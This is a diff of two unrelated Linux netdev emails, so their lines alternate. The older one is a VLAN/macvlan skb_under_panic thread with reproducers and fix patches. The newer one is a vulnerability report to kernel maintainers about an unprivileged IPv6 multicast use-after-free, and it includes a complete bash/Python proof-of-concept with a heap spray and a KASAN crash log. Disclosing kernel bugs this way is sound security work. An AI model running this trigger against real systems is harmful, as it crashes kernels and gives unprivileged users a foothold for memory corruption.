@@ -1,275 +1,356 @@
-Received: from canpmsgout05.his.huawei.com (canpmsgout05.his.huawei.com [113.46.200.220])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7DB962DCF4C
-	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 02:37:27 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=113.46.200.220
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8C2EA26F2BE
+	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 02:47:28 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785724651; cv=none; b=GkPsyalldveCuxZ/U518SKqNvYXWucge+4pRjsxr4UbrTD+LkA9x01lg2om6OwLmr5RhAmb76XGK2shgGZdmZdMqkegDG71xxof4eiKSfJVTEmPG0HFzjADDSv8tpycsKEDzh8Zkkf48J+E8HUhO1tcwLSn7YDvbQ5+QDvkJy5s=
+	t=1785725250; cv=none; b=UOGtZONiWAv7ruv+GYn7cLzdZRoJ3DTmHHcU4LTeez4GLWznO4xmEsUFWYId4hfPmhWOLZ9t7zSbXt0UQWNQkfLjMr5yNNVu5OVcXbeYToQKxt++rcx6nwmlqFncIpKcwrnBT7mmCtNgkZ4O22e7vPx81g2BXVVf6x4uW1qpSkQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785724651; c=relaxed/simple;
-	bh=Foivba0ag4aw97TGJ0kAU1d7f4x1IDHsb31wVq/MELM=;
-	h=Message-ID:Date:MIME-Version:Subject:From:To:CC:References:
-	 In-Reply-To:Content-Type; b=BjLVkTu4r1yc/wnLS+lcYYy8aDIZTAcMlu9HUHIod2BW1VUrsaT/9baZ8pJJ3EzkuP2gsQiF+wlbAEV+t5lxdmifD+a8T1pLTAHGMgS/sRj0uWVIpx8j5n9RvDYfkxWKIEzhYNj8UL0nLvuCY7xE/OlVe8ZdTTA+He48zoKHGXg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=h-partners.com; spf=pass smtp.mailfrom=h-partners.com; dkim=pass (1024-bit key) header.d=h-partners.com header.i=@h-partners.com header.b=dlkOKgA0; arc=none smtp.client-ip=113.46.200.220
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=h-partners.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=h-partners.com
+	s=arc-20240116; t=1785725250; c=relaxed/simple;
+	bh=ktOOeCUppp9aQ/Cn4EPMcZHggCBePIiOZbJ8y2P4vKY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=bvEA67nqvC0vOVEEE9fgeQNT/Qa1OOJBFGZ/DHdaivpLn2AcBW3qKTT2j8WNK46Ff+d2Dxjs4VFBONRTwbTV5/pqRhzsplq7Uy0BbU1pPdtGho+v3u2YF6MRbqUJJgNw2xs7Hb/u3Xtda9/5JMouJdeE5rXDwODrdSib0M59Nvg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=lGOPpzRd; arc=none smtp.client-ip=209.85.214.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=h-partners.com header.i=@h-partners.com header.b="dlkOKgA0"
-dkim-signature: v=1; a=rsa-sha256; d=h-partners.com; s=dkim;
-	c=relaxed/relaxed; q=dns/txt;
-	h=From;
-	bh=/8R5nWAT30YSXmD0IExxy4cy8A4pFfsRSW7MmWDft6c=;
-	b=dlkOKgA0BKEhEer/rG9EumJuIQ+zO/y/nC0c8+lfdXvygZddJ/gxdDETwmpb73u8l0BMnY+mQ
-	fMf5zcYFw3zHgmW+aoUmPIvRPSrTaZN71OSb92ErOS9FIcuaJZQ4SbSk/WY7LWeSqNqlQHjV2Oh
-	k4Xzvc+pak5sXIqJqHgPkag=
-Received: from mail.maildlp.com (unknown [172.19.162.140])
-	by canpmsgout05.his.huawei.com (SkyGuard) with ESMTPS id 4hD0vd3VsNz12LHf;
-	Mon,  3 Aug 2026 10:27:57 +0800 (CST)
-Received: from kwepemr100001.china.huawei.com (unknown [7.202.195.168])
-	by mail.maildlp.com (Postfix) with ESMTPS id 9C61220333;
-	Mon,  3 Aug 2026 10:37:24 +0800 (CST)
-Received: from [10.136.112.147] (10.136.112.147) by
- kwepemr100001.china.huawei.com (7.202.195.168) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.1544.36; Mon, 3 Aug 2026 10:37:23 +0800
-Message-ID: <1c4aed7c-b323-4793-93a6-a43a679d8f12@h-partners.com>
-Date: Mon, 3 Aug 2026 10:37:23 +0800
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="lGOPpzRd"
+Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2ce87c7e3bbso29637045ad.1
+        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 19:47:28 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1785725248; x=1786330048; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=UddWZVAsvawZoNIIq0ass9Br/7SpF5oWqG+HHR7uHyc=;
+        b=lGOPpzRdlF/zn3x3Hv14LlDA11C2DRASW3LbnoB1MNKuBHT4Jze7QmZiGnRChu3WhI
+         mwpYwG6p15AFTG2J0VpIgl5EPAigUf8bNzbp7UmzgCMKgbYBkD5AFYV8PpYLggxByhMn
+         /PBMNHq9mT6YcqqIf8ERlPhZeUXxlTyPtAHki8cQsTMpruoS/pczuc6lI1j7dZlVVFTb
+         Iw1zVSJ4wz3fqd+UUbDNVUFf3xAgZ/cPTZYU4HtQX5DXUBZp0XuFJYrUBs+5KfVdYXp8
+         bMngDoPh6ED0oRhaK+t/7qkseN3yUMBW7ORMnTIYVeQrmqgkohgrWRIFUJLDZL0mMoPK
+         Lwxw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785725248; x=1786330048;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=UddWZVAsvawZoNIIq0ass9Br/7SpF5oWqG+HHR7uHyc=;
+        b=Ou41vK9InftUdJVj6TEC1LmJycgbQC9lwYZkTeyWC1EhfDbrfthHZM7auzYXVoNCtu
+         O9OOu7TdpE9SArQpes+KoT+4yCS4BkxtGOC2WKRKFC2BalbUiDFNs4A4X4X/S/xDXQ+d
+         sdxiAJ3QrBjLxjOR/MrxyG8rGsuNXBzTpzrD2EHDBu39M6wkuaZJzhgwuss+1CHYas0t
+         +GlXG5wUemspX0zyoXvPgWNU7SmzFmIsNFWadPggXumpoKS847bpeuPFRxgmFAvhScI2
+         eM6+XFBNPaTUk0EZtbkcjTfSo4j/5/VPBb9k+PHrJRzloBMK4sIUGyfSnzxhKN7GH9TT
+         27OA==
+X-Gm-Message-State: AOJu0Yw0JDAqBkx8avVDa+GXQCZp2X0Jt/eIovbPPjqkBTY9vDOhJfSG
+	W9bWm8kwjMeRRgdfFdKyhl+d+6fusROwZE3eWQGnDQ93WXEKhOLmwvo+9b+r3dyzx/BuwBWH5YL
+	TyZ5XTucMfjjrIw==
+X-Gm-Gg: AR+sD10nixhFt5tNpql427k5VvkI7XqpYYRWvLbYD43rtr9st2zlecy8rGEAZUQ5YFF
+	TFjCQWMQkS2a/tM/6Ycvc2H3Dq6xHxrHpe5y7VqhpTNV9+0VltvGrZsDUVNnXc4umeQ33oniezS
+	m1CEBDcs624NWm5qRNuYjgjaK1s5q0MW8tDgaH9spX+/7oFgRE7wapqEaKq0JneyIJ7T3FitJFE
+	tiAAZ9vB+o4KVwyd5p6Qw+OvLofiBTqfvseylmHs/clTA4/fkW96Br86+Fm1agCWx7ZOVtKOE63
+	lSiYzB1AcrYMN4kXF0ACGJvZbNVSmoDFj3h0wbk2mIHYr8SEcM3znQoaMurL6pG9KZHYgB5KrjK
+	ZS1o26w9g5LE5V3MDDtmpuB5XDeeLAtww3mP2fb/J7DE1XO6dWtV4OswBYEVl9BzfLCYy+p8lue
+	5LHuHNjaj6VwmwFsK8XWdiA+MXh5OD0WhdLMOQ2LgXLWsHbCja9OJGtnJofiR62qHe5cV2YMYIK
+	Q==
+X-Received: by 2002:a17:903:2f4d:b0:2cf:bf3e:4812 with SMTP id d9443c01a7336-2d0521ea899mr78739455ad.2.1785725247664;
+        Sun, 02 Aug 2026 19:47:27 -0700 (PDT)
+Received: from Roxy.localdomain ([202.8.9.242])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d04b0eb5a3sm30896585ad.46.2026.08.02.19.47.23
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 02 Aug 2026 19:47:26 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: dsahern@kernel.org,
+	idosch@nvidia.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ast@kernel.org,
+	kafai@fb.com,
+	joe@wand.net.nz,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net 0/1] ipv6: orphan prefetched skb before ip6_mr_input
+Date: Mon,  3 Aug 2026 10:47:09 +0800
+Message-ID: <cover.1785724784.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v2 net] vlan: fix skb_under_panic and races when toggling
- HW VLAN offload
-From: xietangxin <xietangxin@h-partners.com>
-To: Eric Dumazet <edumazet@google.com>
-CC: "David S . Miller" <davem@davemloft.net>, Jakub Kicinski
-	<kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman
-	<horms@kernel.org>, Ido Schimmel <idosch@nvidia.com>, Andrew Lunn
-	<andrew+netdev@lunn.ch>, <netdev@vger.kernel.org>, <eric.dumazet@gmail.com>,
-	gaoxingwang <gaoxingwang1@huawei.com>, huyizhen <huyizhen2@huawei.com>
-References: <20260724035419.1473174-1-edumazet@google.com>
- <c05bb9fd-e7ac-472d-83e3-c289f81e717c@h-partners.com>
- <CANn89iKtaD6-ABj5-FnKGpHcRAtAOkiYUn1yzNa4GHTrpH28hw@mail.gmail.com>
- <f9136972-bc6a-4156-9a74-265c204fb1dc@h-partners.com>
- <CANn89iLO_STTESJwU-shGJGZ7BbrFaePb64ePfr=J7bffV4WXA@mail.gmail.com>
- <b00519e7-9c43-4867-baeb-f7ed1303424a@h-partners.com>
- <CANn89iJWJD_KXpeDOne2ujeznOADV8O=rU5+jdqQF6YMEkNkJg@mail.gmail.com>
- <e857b453-3fda-4457-9c93-9eae376157d5@h-partners.com>
-Content-Language: en-US
-In-Reply-To: <e857b453-3fda-4457-9c93-9eae376157d5@h-partners.com>
-Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: 8bit
-X-ClientProxiedBy: kwepems500002.china.huawei.com (7.221.188.17) To
- kwepemr100001.china.huawei.com (7.202.195.168)
+
+Hi Linux kernel maintainers,
+
+We found and validated a issue in net/ipv6/ip6_input.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
+
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+ip6_rcv_core() preserves skb->sk when UDPv6 early demux installs a
+prefetched socket together with the sock_pfree destructor. In
+ip6_mc_input(), the multicast forwarding path takes the original skb in
+the deliver == false branch and passes it into ip6_mr_input() instead
+of cloning or orphaning it first.
+
+That original skb can then be queued in the unresolved multicast route
+queue. Once the receive-side RCU section ends, userspace can close the
+matched UDP socket before unresolved queue cleanup runs. When the queued
+skb is later freed during ip6mr_destroy_unres(), sock_pfree()
+dereferences the stale skb->sk and triggers the use-after-free.
+
+Reproducer:
+
+    chmod +x ~/poc.sh
+    unshare -Urn -- bash -lc ~/poc.sh
+
+We run the PoC in an x86 QEMU environment.
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euo pipefail
+
+GROUP_ADDR="${GROUP_ADDR:-ff0e::123}"
+SRC_ADDR="${SRC_ADDR:-2001:db8:1::2}"
+DST_ADDR="${DST_ADDR:-2001:db8:1::1}"
+SPORT="${SPORT:-31337}"
+DPORT="${DPORT:-42424}"
+IF_RX="${IF_RX:-v0}"
+IF_TX="${IF_TX:-v1}"
+COUNT="${COUNT:-1}"
+
+cleanup() {
+	ip link del "$IF_RX" 2>/dev/null || true
+}
+trap cleanup EXIT
+
+ip link del "$IF_RX" 2>/dev/null || true
+ip link add "$IF_RX" type veth peer name "$IF_TX"
+ip link set lo up
+ip link set "$IF_RX" up
+ip link set "$IF_TX" up
+ip -6 addr add "${DST_ADDR}/64" dev "$IF_RX" nodad
+ip -6 addr add "${SRC_ADDR}/64" dev "$IF_TX" nodad
+
+export GROUP_ADDR SRC_ADDR DST_ADDR SPORT DPORT IF_RX IF_TX COUNT
+
+python3 - <<'PY'
+import fcntl
+import ipaddress
+import os
+import socket
+import struct
+import sys
+import time
+
+SIOCGIFHWADDR = 0x8927
+SOL_IPV6 = socket.IPPROTO_IPV6
+MRT6_INIT = 200
+MRT6_ADD_MIF = 202
+
+GROUP = os.environ["GROUP_ADDR"]
+SRC_ADDR = os.environ["SRC_ADDR"]
+DST_ADDR = os.environ["DST_ADDR"]
+SPORT = int(os.environ["SPORT"])
+DPORT = int(os.environ["DPORT"])
+IF_RX = os.environ["IF_RX"]
+IF_TX = os.environ["IF_TX"]
+COUNT = int(os.environ["COUNT"])
 
 
+def get_hwaddr(ifname: str) -> bytes:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        ifreq = struct.pack("256s", ifname.encode())
+        res = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, ifreq)
+        return res[18:24]
+    finally:
+        s.close()
 
-On 7/25/2026 9:42 AM, xietangxin wrote:
-> 
-> 
-> On 7/24/2026 6:43 PM, Eric Dumazet wrote:
->> On Fri, Jul 24, 2026 at 12:24 PM xietangxin <xietangxin@h-partners.com> wrote:
->>>
->>>
->>>
->>> On 7/24/2026 5:39 PM, Eric Dumazet wrote:
->>>> On Fri, Jul 24, 2026 at 11:29 AM xietangxin <xietangxin@h-partners.com> wrote:
->>>>>
->>>>>
->>>>>
->>>>> On 7/24/2026 4:40 PM, Eric Dumazet wrote:
->>>>>> On Fri, Jul 24, 2026 at 10:13 AM xietangxin <xietangxin@h-partners.com> wrote:
->>>>>>>
->>>>>>>
->>>>>>> Hi Eric,
->>>>>>>
->>>>>>> While testing this backport in our local environment, we hit a similar
->>>>>>> skb_under_panic issue when layering macvlan on top of a VLAN device.
->>>>>>>
->>>>>>> macvlan does't sync vlan's need_headroom, so skb head align to 16 bytes.
->>>>>>> when skb arrive vlan, call vlan_header_ops -> vlan_dev_hard_header,
->>>>>>> push VLAN_HLEN 4 + ETH_LEN 14 to skb, oops.
->>>>>>>
->>>>>>> Call trace
->>>>>>> ==========
->>>>>>> [  103.088286] skbuff: skb_under_panic: text:ffff800080d2159c len:114 put:14 head:ffff0000d2055800 data:ffff0000d20557fe tail:0x70 end:0x6c0 dev:macvlan
->>>>>>> [  103.088344] ------------[ cut here ]------------
->>>>>>> [  103.088346] kernel BUG at net/core/skbuff.c:214!
->>>>>>> [  103.088350] Internal error: Oops - BUG: 00000000f2000800 [#1]  SMP
->>>>>>> [  103.098003] CPU: 3 UID: 0 PID: 160 Comm: kworker/3:3 Kdump: loaded Not tainted 7.2.0-rc4+ #56 PREEMPTLAZY
->>>>>>> [  103.099007] Hardware name: QEMU KVM Virtual Machine, BIOS 0.0.0 02/06/2015
->>>>>>> [  103.099725] Workqueue: mld mld_ifc_work
->>>>>>> [  103.100169] pstate: 60400005 (nZCv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
->>>>>>> [  103.100898] pc : skb_panic+0x58/0x68
->>>>>>> [  103.101310] lr : skb_panic+0x58/0x68
->>>>>>> [  103.101738] sp : ffff800083d1b950
->>>>>>> [  103.109858] Call trace:
->>>>>>> [  103.110161]  skb_panic+0x58/0x68 (P)
->>>>>>> [  103.110578]  skb_push+0x58/0x60
->>>>>>> [  103.110971]  eth_header+0x3c/0xe0
->>>>>>> [  103.111359]  vlan_dev_hard_header+0x7c/0x1a8 [8021q]
->>>>>>> [  103.111904]  macvlan_hard_header+0x38/0x60 [macvlan]
->>>>>>> [  103.112455]  neigh_resolve_output.part.0+0xa8/0x168
->>>>>>> [  103.113081]  neigh_resolve_output+0x4c/0x90
->>>>>>> [  103.113639]  ip6_finish_output2+0x2c0/0x858
->>>>>>> [  103.114182]  ip6_finish_output+0x23c/0x398
->>>>>>> [  103.114741]  ip6_output+0x90/0x250
->>>>>>> [  103.115211]  NF_HOOK.constprop.0+0x54/0x118
->>>>>>> [  103.115699]  mld_sendpack+0x1cc/0x3d0
->>>>>>> [  103.116202]  mld_send_cr+0x1cc/0x318
->>>>>>> [  103.116696]  mld_ifc_work+0x38/0x128
->>>>>>>
->>>>>>>
->>>>>>> Reproducer
->>>>>>> ==========
->>>>>>> ip link add veth0 type veth peer name veth1
->>>>>>> ip link set veth0 up
->>>>>>> ip link set veth1 up
->>>>>>>
->>>>>>> ip link add link veth0 name vlan_test type vlan id 10 reorder_hdr off
->>>>>>> ip link set vlan_test up
->>>>>>>
->>>>>>> # macvlan does't sync vlan's need_headroom,
->>>>>>> ip link add link vlan_test name macvlan type macvlan
->>>>>>> ip link set macvlan up
->>>>>>>
->>>>>>> ethtool -K veth0 tx-vlan-hw-insert off
->>>>>>>
->>>>>>> # skb_under_panic
->>>>>>> ip -6 addr add fe80::1/64 dev macvlan
->>>>>>
->>>>>> Thanks for testing and for providing a clean repro.
->>>>>>
->>>>>> This definitely is a bug in macvlan :/, I am pretty sure it can be
->>>>>> stacked on top of devices that have a non zero needed_headroom.
->>>>>>
->>>>>> Maybe the bug was hidden because skb->head was properly reallocated
->>>>>> for such lower devices incurring an expensive kmalloc()/kfree().
->>>>>>
->>>>>>
->>>>>> diff --git a/drivers/net/macvlan.c b/drivers/net/macvlan.c
->>>>>> index c40fa331836bb2395267914807542ae5094e1a3c..0fb619413d94c89e472efed4a6a9f0dd7fb69940
->>>>>> 100644
->>>>>> --- a/drivers/net/macvlan.c
->>>>>> +++ b/drivers/net/macvlan.c
->>>>>> @@ -950,6 +950,7 @@ static int macvlan_init(struct net_device *dev)
->>>>>>         dev->lltx               = true;
->>>>>>         netif_inherit_tso_max(dev, lowerdev);
->>>>>>         dev->hard_header_len    = lowerdev->hard_header_len;
->>>>>> +       dev->needed_headroom    = lowerdev->needed_headroom;
->>>>>>         macvlan_set_lockdep_class(dev);
->>>>>>
->>>>>>         vlan->pcpu_stats = netdev_alloc_pcpu_stats(struct vlan_pcpu_stats);
->>>>>> @@ -1824,6 +1825,7 @@ static int macvlan_device_event(struct
->>>>>> notifier_block *unused,
->>>>>>         case NETDEV_FEAT_CHANGE:
->>>>>>                 list_for_each_entry(vlan, &port->vlans, list) {
->>>>>>                         netif_inherit_tso_max(vlan->dev, dev);
->>>>>> +                       vlan->dev->needed_headroom = dev->needed_headroom;
->>>>>>                         netdev_update_features(vlan->dev);
->>>>>>                 }
->>>>>>                 break;
->>>>> Hi Eric,
->>>>>
->>>>> I tested this patch with two reproducers, and it indeed fixes.
->>>>> However, are there other similar issues where devices on vlan?
->>>>
->>>> Tell me :)
->>>>
->>>> At least our selftests passed.
->>>>
->>>> Note that many devices have belts and suspenders. They use
->>>> skb_cow(skb, min_headroom) or pskb_expand_head(), because we have
->>>> numerous bugs yet to be fixed.
->>> Hi Eric,
->>>
->>> I ran few tests on other devices over vlan,
->>> and ipvlan triggers the exact same skb_under_panic issue.
->>> I haven't tested many devices, and there might be others.
->>>
->>> Call trace
->>> ==========
->>> [  113.414244] skbuff: skb_under_panic: text:ffff800080d2159c len:114 put:14 head:ffff0000c716d000 data:ffff0000c716cffe tail:0x70 end:0x6c0 dev:ipvlan_test
->>> [  113.414286] ------------[ cut here ]------------
->>> [  113.414288] kernel BUG at net/core/skbuff.c:214!
->>> [  113.414290] Internal error: Oops - BUG: 00000000f2000800 [#1]  SMP
->>> [  113.424840] CPU: 1 UID: 0 PID: 315 Comm: kworker/1:4 Kdump: loaded Not tainted 7.2.0-rc4+ #59 PREEMPTLAZY
->>> [  113.425832] Hardware name: QEMU KVM Virtual Machine, BIOS 0.0.0 02/06/2015
->>> [  113.426573] Workqueue: mld mld_ifc_work
->>> [  113.427039] pstate: 60400005 (nZCv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
->>> [  113.427788] pc : skb_panic+0x58/0x68
->>> [  113.428224] lr : skb_panic+0x58/0x68
->>> [  113.428638] sp : ffff800083d1b950
->>> [  113.437079]  skb_panic+0x58/0x68 (P)
->>> [  113.437558]  skb_push+0x58/0x60
->>> [  113.437949]  eth_header+0x3c/0xe0
->>> [  113.438344]  vlan_dev_hard_header+0xa0/0x1d0 [8021q]
->>> [  113.438913]  ipvlan_hard_header+0x34/0x58 [ipvlan]
->>> [  113.439491]  neigh_resolve_output.part.0+0xa8/0x168
->>> [  113.440027]  neigh_resolve_output+0x4c/0x90
->>> [  113.440505]  ip6_finish_output2+0x2c0/0x858
->>> [  113.440976]  ip6_finish_output+0x23c/0x398
->>> [  113.441442]  ip6_output+0x90/0x250
->>> [  113.441835]  NF_HOOK.constprop.0+0x54/0x118
->>> [  113.442305]  mld_sendpack+0x1cc/0x3d0
->>> [  113.442726]  mld_send_cr+0x1cc/0x318
->>> [  113.443157]  mld_ifc_work+0x38/0x128
->>>
->>> Reproducer
->>> ==========
->>> ip link add veth0 type veth peer name veth1
->>> ip link set veth0 up
->>> ip link set veth1 up
->>>
->>> ip link add link veth0 name vlan_test type vlan id 10 reorder_hdr off
->>> ip link set vlan_test up
->>>
->>> ip link add link vlan_test name ipvlan_test type ipvlan mode l2
->>> ip link set ipvlan_test up
->>>
->>> ethtool -K veth0 tx-vlan-hw-insert off
->>>
->>> ip -6 addr add fe80::1/64 dev ipvlan_test
->>
->> I am not surprised, ipvlan has been copy/pasted from macvlan :)
->>
->> diff --git a/drivers/net/ipvlan/ipvlan_main.c b/drivers/net/ipvlan/ipvlan_main.c
->> index ed46439a9f4eb1dd8bfaf6c83476ba4f2aff31bc..7513c005a5121676d3f8edb0898492ad434a9fab
->> 100644
->> --- a/drivers/net/ipvlan/ipvlan_main.c
->> +++ b/drivers/net/ipvlan/ipvlan_main.c
->> @@ -146,6 +146,7 @@ static int ipvlan_init(struct net_device *dev)
->>         dev->lltx = true;
->>         netif_inherit_tso_max(dev, phy_dev);
->>         dev->hard_header_len = phy_dev->hard_header_len;
->> +       dev->needed_headroom = phy_dev->needed_headroom;
->>
->>         netdev_lockdep_set_classes(dev);
->>
->> @@ -773,6 +774,7 @@ static int ipvlan_device_event(struct
->> notifier_block *unused,
->>         case NETDEV_FEAT_CHANGE:
->>                 list_for_each_entry(ipvlan, &port->ipvlans, pnode) {
->>                         netif_inherit_tso_max(ipvlan->dev, dev);
->> +                       ipvlan->dev->needed_headroom = dev->needed_headroom;
->>                         netdev_update_features(ipvlan->dev);
->>                 }
->>                 break;
-> Hi Eric,
-> 
-> It works fine.
-> Thanks for the quick fix!
-Hi Eric,
 
-Gentle ping on this thread.
+def csum(data: bytes) -> int:
+    if len(data) & 1:
+        data += b"\x00"
+    total = 0
+    for i in range(0, len(data), 2):
+        total += (data[i] << 8) + data[i + 1]
+    while total >> 16:
+        total = (total & 0xFFFF) + (total >> 16)
+    return (~total) & 0xFFFF
 
-Just wanted to check if you have time to post the v3 patch,
-or if there's anything else needed on my end?
--- 
+
+def udp6_checksum(src: bytes, dst: bytes, udp: bytes, payload: bytes) -> int:
+    pseudo = src + dst + struct.pack("!I3xB", len(udp) + len(payload), socket.IPPROTO_UDP)
+    return csum(pseudo + udp + payload)
+
+
+rx_mac = get_hwaddr(IF_RX)
+tx_mac = get_hwaddr(IF_TX)
+tx_ifindex = socket.if_nametoindex(IF_TX)
+rx_ifindex = socket.if_nametoindex(IF_RX)
+src_ip = ipaddress.IPv6Address(SRC_ADDR).packed
+group_ip = ipaddress.IPv6Address(GROUP).packed
+
+print(f"[+] {IF_RX} ifindex={rx_ifindex} mac={rx_mac.hex(':')}")
+print(f"[+] {IF_TX} ifindex={tx_ifindex} mac={tx_mac.hex(':')}")
+
+mroute = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
+mroute.settimeout(1.0)
+mroute.setsockopt(SOL_IPV6, MRT6_INIT, struct.pack("@I", 1))
+mif = struct.pack("@HBBHI", 0, 0, 1, rx_ifindex, 0)
+mroute.setsockopt(SOL_IPV6, MRT6_ADD_MIF, mif)
+print("[+] Enabled IPv6 multicast routing and added ingress MIF")
+
+udp = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
+udp.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, IF_RX.encode() + b"\x00")
+udp.bind((GROUP, DPORT, 0, 0))
+udp.connect((SRC_ADDR, SPORT, 0, 0))
+print("[+] Bound UDP socket to multicast group and connected it to the sender")
+
+payload = b"UAF!"
+udp_len = 8 + len(payload)
+udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, 0)
+udp_sum = udp6_checksum(src_ip, group_ip, udp_hdr, payload)
+udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, udp_sum)
+ipv6_hdr = struct.pack("!IHBB16s16s", (6 << 28), udp_len, socket.IPPROTO_UDP, 64, src_ip, group_ip)
+eth_hdr = rx_mac + tx_mac + struct.pack("!H", 0x86DD)
+frame = eth_hdr + ipv6_hdr + udp_hdr + payload
+
+pkt = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x86DD))
+pkt.bind((IF_TX, 0))
+
+for i in range(COUNT):
+    pkt.send(frame)
+    print(f"[+] Sent crafted frame {i + 1}/{COUNT}")
+    time.sleep(0.05)
+
+try:
+    report = mroute.recv(4096)
+    print(f"[+] Received multicast-routing report ({len(report)} bytes)")
+except TimeoutError:
+    print("[-] Did not receive multicast-routing report before timeout", file=sys.stderr)
+
+udp.close()
+print("[+] Closed matched UDP socket; forcing a short grace-period window before mroute cleanup")
+for _ in range(16):
+    spray = []
+    for _ in range(64):
+        spray.append(socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0))
+    for s in spray:
+        s.close()
+time.sleep(1)
+print("[+] Closing the mroute socket to flush the unresolved queue")
+mroute.close()
+time.sleep(1)
+print("[-] No crash observed after mroute cleanup")
+PY
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  233.980031][T10483] page_owner tracks the page as allocated
+[  233.980997][T10483] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10250, tgid 10250 (sshd-auth), ts 133770429918, free_ts 133706329619
+[  233.984140][T10483] page last free pid 10250 tgid 10250 stack trace:
+[  233.985380][T10483] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  233.986371][T10483] CPU: 1 UID: 1028 PID: 10483 Comm: python3 Not tainted 6.12.95 #2
+[  233.987459][T10483] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  233.989090][T10483] Call Trace:
+[  233.989583][T10483]  <TASK>
+[  233.989996][T10483]  panic (build/../kernel/panic.c:108)
+[  233.990555][T10483]  ? __pfx_panic (build/../kernel/panic.c:740)
+[  233.991198][T10483]  ? rcu_is_watching (build/../include/linux/context_tracking.h:128 (discriminator 1) build/../kernel/rcu/tree.c:752 (discriminator 1))
+[  233.991902][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  233.992689][T10483]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
+[  233.993399][T10483]  ? mark_held_locks (build/../kernel/locking/lockdep.c:4364 (discriminator 1))
+[  233.994058][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
